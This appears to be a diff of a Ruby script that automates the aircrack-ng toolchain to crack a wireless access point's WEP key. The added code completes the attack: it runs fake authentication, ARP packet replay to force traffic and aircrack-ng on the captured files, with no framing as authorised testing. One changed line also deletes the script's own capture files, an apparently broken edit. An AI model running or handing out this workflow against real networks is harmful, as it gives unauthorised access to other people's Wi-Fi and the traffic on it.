@@ -1,3 +1,5 @@
+#TODO: add shebang declaration
+
 require 'open3'
 
 def user_is_root?
@@ -121,7 +123,7 @@ def select_access_point(monitor_interface)
   system(cmd)
   puts
   aplist = parse_aps('wcrb-01.txt')
-  ct = 1
+  `rm -f wcrb-*`
   ap_descs = []
   aplist.each do |apinfo|
     ap_descs << "#{apinfo.essid}: #{apinfo.beacons} beacons, #{apinfo.packets} packets"
@@ -130,12 +132,7 @@ def select_access_point(monitor_interface)
   return aplist[select_from_list(ap_descs)]
 end
 
-def test_injection(apinfo, monitor_interface)
-  puts "Testing injection for the selected settings"
-  cmd = "aireplay-ng -9 -e #{apinfo.essid} -a #{apinfo.bssid} #{monitor_interface}"
-  puts "=> #{cmd}"
-  system(cmd)
-  puts "If no packets were injected, consider starting over and choosing a different AP."
+def ask_continue(monitor_interface)
   print "Continue? [Y/n] > "
   if gets.strip =~ /^[nN]/
     stop_monitor_mode(monitor_interface)
@@ -144,10 +141,43 @@ def test_injection(apinfo, monitor_interface)
   return true
 end
 
+def test_injection(apinfo, monitor_interface)
+  puts "Testing injection for the selected settings"
+  cmd = "aireplay-ng -9 -e #{apinfo.essid} -a #{apinfo.bssid} #{monitor_interface}"
+  puts "=> #{cmd}"
+  system(cmd)
+  puts "If no packets were injected, consider starting over and choosing a different AP."
+  return ask_continue(monitor_interface)
+end
+
 def open_capture_window(apinfo, monitor_interface)
   puts "Opening packet capture in separate window"
   cmd = "airodump-ng -c #{apinfo.channel} --bssid #{apinfo.bssid} -w wcrb #{monitor_interface}"
   cmd = "gnome-terminal --geometry 100x25-0+0 --execute #{cmd} &"
+  puts "=> #{cmd}"
+  system(cmd)
+end
+
+def authenticate_with_ap(apinfo, monitor_interface)
+  puts "About to attempt authentication. This is the most critical step."
+  cmd = "aireplay-ng -1 0 -e #{apinfo.essid} -a #{apinfo.bssid} #{monitor_interface}"
+  puts "=> #{cmd}"
+  system(cmd)
+  puts "If authentication failed, you can retry wit a different AP."
+  return ask_continue(monitor_interface)
+end
+
+def open_crack_window(apinfo, monitor_interface)
+  puts "Opening aircrack-ng in separate window"
+  cmd = "aircrack-ng -b #{apinfo.bssid} wcrb*.cap"
+  cmd = "gnome-terminal --geometry 100x25-0-0 --execute #{cmd} &"
+  puts "=> #{cmd}"
+  system(cmd)
+end
+
+def inject_packets(apinfo, monitor_interface)
+  puts "Starting packet injection... good luck!"
+  cmd = "aireplay-ng -3 -b #{apinfo.bssid} #{monitor_interface}"
   puts "=> #{cmd}"
   system(cmd)
 end
@@ -162,12 +192,9 @@ def main
   monitor_interface = set_monitor_mode(wifi_id, apinfo.channel)
   return unless test_injection(apinfo, monitor_interface)
   open_capture_window(apinfo, monitor_interface)
-  return
-
-  #TODO: implement...
-  authenticate_with_ap(apinfo)
-  inject_packets(apinfo)
-  crack_key(apinfo)
+  return unless authenticate_with_ap(apinfo, monitor_interface)
+  open_crack_window(apinfo, monitor_interface)
+  inject_packets(apinfo, monitor_interface)
 end
 
 main
